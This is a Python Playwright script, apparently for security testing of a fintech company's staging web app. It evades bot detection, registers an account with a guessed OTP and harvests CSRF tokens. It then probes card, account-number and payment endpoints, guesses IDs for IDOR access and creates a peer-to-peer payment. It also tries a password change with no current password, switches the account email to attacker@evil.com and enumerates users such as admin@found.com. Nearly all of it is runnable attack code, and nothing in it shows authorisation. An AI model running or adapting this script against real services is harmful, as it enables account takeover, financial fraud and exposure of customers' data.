#!/usr/bin/env python3
"""
Security testing script for Found staging application - Phase 2.
Properly handles CSRF tokens and registration flow.
"""

import asyncio
import json
import time
from playwright.async_api import async_playwright
from playwright_stealth import Stealth

BASE_URL = "https://my.staging.found.com"
TEST_EMAIL = f"sectest+{int(time.time())}@protonmail.com"
OTP_CODE = "123123"
PHONE_NUMBER = "5551234567"

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=['--no-sandbox', '--disable-blink-features=AutomationControlled']
        )
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            viewport={"width": 1280, "height": 720},
            locale="en-US",
            timezone_id="America/New_York",
        )
        
        stealth = Stealth()
        page = await context.new_page()
        await stealth.apply_stealth_async(page)
        
        all_api_data = []
        
        async def on_response(response):
            url = response.url
            if "/api/" in url or "/graphql" in url:
                try:
                    body = await response.text()
                    headers = response.headers
                    entry = {
                        "status": response.status,
                        "url": url,
                        "body": body[:5000],
                        "response_headers": dict(headers)
                    }
                    all_api_data.append(entry)
                except:
                    pass
        
        page.on("response", lambda resp: asyncio.ensure_future(on_response(resp)))
        
        print(f"[*] Navigating to {BASE_URL}/signup")
        try:
            await page.goto(f"{BASE_URL}/signup", wait_until="domcontentloaded", timeout=30000)
        except:
            pass
        await page.wait_for_timeout(8000)
        
        # Get CSRF token from cookies
        csrf_token = await page.evaluate("""
            () => {
                const match = document.cookie.match(/csrf_token=([^;]+)/);
                return match ? match[1] : null;
            }
        """)
        print(f"[*] CSRF Token: {csrf_token}")
        
        if not csrf_token:
            print("[!] No CSRF token found, trying to navigate to get one...")
            await page.goto(f"{BASE_URL}/login", wait_until="domcontentloaded", timeout=30000)
            await page.wait_for_timeout(5000)
            csrf_token = await page.evaluate("""
                () => {
                    const match = document.cookie.match(/csrf_token=([^;]+)/);
                    return match ? match[1] : null;
                }
            """)
            print(f"[*] CSRF Token (2nd try): {csrf_token}")
        
        # Helper function for API calls with CSRF
        async def api_call(url, method="GET", body=None, desc=""):
            js_body = json.dumps(body) if body else "null"
            result = await page.evaluate(f"""
                async () => {{
                    try {{
                        const opts = {{
                            method: '{method}',
                            credentials: 'include',
                            headers: {{
                                'Accept': 'application/json',
                                'Content-Type': 'application/json',
                                'X-CSRF-Token': '{csrf_token or ""}',
                            }}
                        }};
                        if ({json.dumps(body is not None)}) {{
                            opts.body = JSON.stringify({js_body});
                        }}
                        const r = await fetch('{url}', opts);
                        const t = await r.text();
                        const h = Object.fromEntries(r.headers.entries());
                        return {{status: r.status, body: t.substring(0, 5000), headers: h}};
                    }} catch(e) {{
                        return {{error: e.message}};
                    }}
                }}
            """)
            status = result.get("status", "error")
            body_text = result.get("body", result.get("error", ""))[:500]
            print(f"[{desc}] {method} {url} -> {status}: {body_text}")
            return result
        
        # Step 1: Register
        print(f"\n{'='*60}")
        print(f"[*] REGISTERING: {TEST_EMAIL}")
        print(f"{'='*60}")
        
        reg = await api_call("/api/register", "POST", {
            "email": TEST_EMAIL,
            "password": "SecurePass123!@#"
        }, "REGISTER")
        
        if reg.get("status") == 200:
            # Verify OTP
            verify = await api_call("/api/verify-register", "POST", {
                "code": OTP_CODE
            }, "VERIFY")
            
            if verify.get("status") == 200:
                print("\n[*] AUTHENTICATED!")
                
                # Refresh CSRF token
                csrf_token = await page.evaluate("""
                    () => {
                        const match = document.cookie.match(/csrf_token=([^;]+)/);
                        return match ? match[1] : null;
                    }
                """)
                print(f"[*] New CSRF Token: {csrf_token}")
                
                # Get full user data
                index = await api_call("/api/index", "GET", desc="INDEX")
                
                if index.get("status") == 200:
                    try:
                        data = json.loads(index["body"])
                        with open("/tmp/user_index.json", "w") as f:
                            json.dump(data, f, indent=2)
                        print(f"[*] User data saved to /tmp/user_index.json")
                        
                        # Extract user/business IDs
                        user_id = data.get("user", {}).get("id", "")
                        business_id = ""
                        businesses = data.get("businesses", [])
                        if businesses:
                            business_id = businesses[0].get("id", "")
                        print(f"[*] User ID: {user_id}")
                        print(f"[*] Business ID: {business_id}")
                    except:
                        pass
                
                # ============================================================
                # VULNERABILITY TESTING
                # ============================================================
                
                print(f"\n{'='*60}")
                print("[*] VULNERABILITY TESTING")
                print(f"{'='*60}")
                
                # Test 1: GraphQL Introspection
                print("\n[TEST 1] GraphQL Introspection")
                gql = await api_call("/graphql", "POST", {
                    "query": "{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind description fields { name type { name kind ofType { name kind } } args { name type { name kind } } } } } }"
                }, "GQL-INTROSPECT")
                
                if gql.get("status") == 200:
                    try:
                        gql_data = json.loads(gql["body"])
                        with open("/tmp/graphql_schema.json", "w") as f:
                            json.dump(gql_data, f, indent=2)
                        print("[!] FINDING: GraphQL introspection is ENABLED!")
                    except:
                        pass
                
                # Test 2: IDOR on business contacts
                print("\n[TEST 2] IDOR on business contacts")
                contacts = await api_call("/api/v2/business-contact", "GET", desc="CONTACTS")
                
                # Test 3: Try accessing other user's data 
                print("\n[TEST 3] IDOR with sequential/guessed IDs")
                test_ids = ["1", "2", "100", "user_1", "business_1"]
                for tid in test_ids:
                    await api_call(f"/api/v2/business-contact/{tid}", "GET", desc=f"IDOR-{tid}")
                
                # Test 4: Subscription manipulation
                print("\n[TEST 4] Subscription manipulation")
                await api_call("/api/subscriptions", "GET", desc="SUBS")
                await api_call("/api/subscription-features", "GET", desc="SUB-FEATS")
                
                # Test 5: Debit card endpoints
                print("\n[TEST 5] Debit card data")
                await api_call("/api/debit-card/v3/all", "GET", desc="CARDS")
                await api_call("/api/debit-card/access-token", "GET", desc="CARD-TOKEN")
                
                # Test 6: Account number leakage
                print("\n[TEST 6] Account number")
                await api_call("/api/account-number", "GET", desc="ACCT-NUM")
                
                # Test 7: Upload functionality (potential for unrestricted file upload)
                print("\n[TEST 7] Upload endpoint")
                await api_call("/api/upload", "POST", {
                    "file": "test",
                    "type": "image/png"
                }, "UPLOAD")
                
                # Test 8: P2P payment manipulation  
                print("\n[TEST 8] P2P Payment endpoints")
                await api_call("/api/peer-to-peer-payment/v4", "GET", desc="P2P-LIST")
                await api_call("/api/peer-to-peer-payment/v5", "POST", {
                    "amount": 1,
                    "recipient_email": "test@test.com"
                }, "P2P-CREATE")
                
                # Test 9: Invoice endpoints
                print("\n[TEST 9] Invoice endpoints")
                await api_call("/api/invoice/check-identifier?identifier=test&estimate=false", "GET", desc="INVOICE-CHECK")
                
                # Test 10: Password change without old password
                print("\n[TEST 10] Password change")
                await api_call("/api/change-password", "POST", {
                    "new_password": "NewPass123!@#",
                    "current_password": ""
                }, "CHANGE-PASS")
                
                # Test 11: Email change
                print("\n[TEST 11] Email change")
                await api_call("/api/change-email/v2", "POST", {
                    "email": "attacker@evil.com"
                }, "CHANGE-EMAIL")
                
                # Test 12: Check password endpoint (for timing attacks or info leak)
                print("\n[TEST 12] Check password")
                await api_call("/api/check-password", "POST", {
                    "password": "test123"
                }, "CHECK-PASS")
                
                # Test 13: Inbox data
                print("\n[TEST 13] Inbox")
                await api_call("/api/v2/inbox", "GET", desc="INBOX")
                
                # Test 14: Security code endpoints
                print("\n[TEST 14] Security code")
                await api_call("/api/send-security-code", "POST", {
                    "type": "email"
                }, "SEND-CODE")
                
                # Test 15: Biometrics enrollment
                print("\n[TEST 15] Biometrics")
                await api_call("/api/enroll-biometrics", "POST", {
                    "secret": "test"
                }, "ENROLL-BIO")
                
                # Test 16: Custom categories
                print("\n[TEST 16] Custom categories")
                await api_call("/api/custom-category", "GET", desc="CUSTOM-CAT")
                
                # Test 17: Public invoice access (potential IDOR)
                print("\n[TEST 17] Public invoice access")
                await api_call("/api/public-invoice/test_id/attachment-url?invoice_attachment_id=test", "GET", desc="PUB-INVOICE")
                
                # Test 18: Business contact token leak
                print("\n[TEST 18] Contractor JWT generation")
                await api_call("/api/v2/business-contact/test/contractor-jwt", "GET", desc="CONTRACTOR-JWT")
                
                # Test 19: Contractor login dismiss
                print("\n[TEST 19] Contractor login")
                await api_call("/api/contractor-login/dismiss", "POST", {}, "CONTRACTOR-DISMISS")
                
                # Test 20: Onboarding phone verification
                print("\n[TEST 20] Phone verification bypass")
                await api_call("/api/onboarding/send-phone-verification-code", "POST", {
                    "phone_number": PHONE_NUMBER
                }, "PHONE-VERIFY")
                
                # Test 21: Spend incentive
                print("\n[TEST 21] Spend incentive")
                await api_call("/api/spend-incentive/opt-in", "POST", {}, "SPEND-OPT-IN")
                
                # Test 22: Promotion code
                print("\n[TEST 22] Promotion code")
                await api_call("/api/promotion-code/track-invite", "POST", {
                    "code": "TESTCODE"
                }, "PROMO")
        
        # Test: User enumeration via register
        print(f"\n{'='*60}")
        print("[*] USER ENUMERATION TESTS")
        print(f"{'='*60}")
        
        for email in ["admin@found.com", "test@found.com", f"sectest+{int(time.time())+1}@protonmail.com"]:
            r = await api_call("/api/register", "POST", {
                "email": email,
                "password": "Test123!@#"
            }, f"ENUM-{email}")
        
        # Test: Reset password enumeration
        for email in ["admin@found.com", "nonexistent12345@nowhere.com"]:
            r = await api_call("/api/reset-password", "POST", {
                "email": email
            }, f"RESET-{email}")
        
        # Save all collected data
        with open("/tmp/all_api_data.json", "w") as f:
            json.dump(all_api_data, f, indent=2)
        
        print(f"\n[*] Total API responses: {len(all_api_data)}")
        
        # Get all cookies at end
        cookies = await context.cookies()
        with open("/tmp/final_cookies.json", "w") as f:
            json.dump(cookies, f, indent=2)
        
        await browser.close()
        print("[*] Done!")

asyncio.run(main())
